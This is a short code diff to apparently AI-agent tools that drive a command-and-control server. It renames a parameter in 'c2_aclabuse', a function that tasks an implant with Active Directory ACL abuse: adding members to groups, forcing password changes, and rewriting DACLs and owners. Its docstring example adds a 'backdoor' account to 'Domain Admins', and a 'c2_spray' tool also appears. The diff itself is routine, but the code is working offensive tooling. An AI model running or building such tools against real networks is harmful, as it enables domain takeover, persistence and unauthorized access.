@@ -459,7 +459,7 @@ def c2_spray(agent_id: str, target_ip: str) -> str:
 
 
 @tool
-def c2_aclabuse(agent_id: str, operation: str, args: str) -> str:
+def c2_aclabuse(agent_id: str, operation: str, operation_args: str) -> str:
     """
     Exploit an ACL misconfiguration.
     operation choices:
@@ -468,15 +468,15 @@ def c2_aclabuse(agent_id: str, operation: str, args: str) -> str:
       genericwrite        <target> <attribute> <value>
       writedacl           <target> <principal> <right>
       writeowner          <target> <new_owner>
-    args: positional arguments as a space-separated string.
-    Example: operation='addmember', args='Domain Admins backdoor'
+    operation_args: positional arguments as a space-separated string.
+    Example: operation='addmember', operation_args='Domain Admins backdoor'
     Blocks up to 60 seconds.
     """
     valid_ops = {"addmember", "forcechangepassword", "genericwrite", "writedacl", "writeowner"}
     op = operation.lower().strip()
     if op not in valid_ops:
         return f"[-] Unknown operation '{op}'. Valid: {', '.join(valid_ops)}"
-    instruction = op + "|" + "|".join(args.split())
+    instruction = op + "|" + "|".join(operation_args.split())
     res = _post("/task", {"agent_id": agent_id, "task_type": "aclabuse", "instruction": instruction})
     if "error" in res:
         return f"[error] {res['error']}"
